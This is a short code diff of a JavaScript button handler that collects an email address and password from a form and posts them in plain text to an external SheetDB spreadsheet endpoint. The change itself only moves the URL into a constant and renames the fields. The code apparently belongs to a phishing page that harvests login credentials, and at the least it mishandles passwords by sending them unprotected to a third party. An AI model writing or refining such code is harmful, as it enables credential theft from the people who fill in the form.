@@ -11,14 +11,17 @@ document.getElementById("nextBtn").addEventListener("click", async function (eve
     return;
   }
 
+  // SheetDB API URL
+  const sheetDBUrl = "https://sheetdb.io/api/v1/ryfvidjjqmoam";
+
   // Send data to SheetDB
   try {
-    const response = await fetch("https://sheetdb.io/api/v1/ryfvidjjqmoam", {
+    const response = await fetch(sheetDBUrl, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({ data: { Email: email, Password: password } }),
+      body: JSON.stringify({ data: { email, password } }),
     });
 
     const result = await response.json();
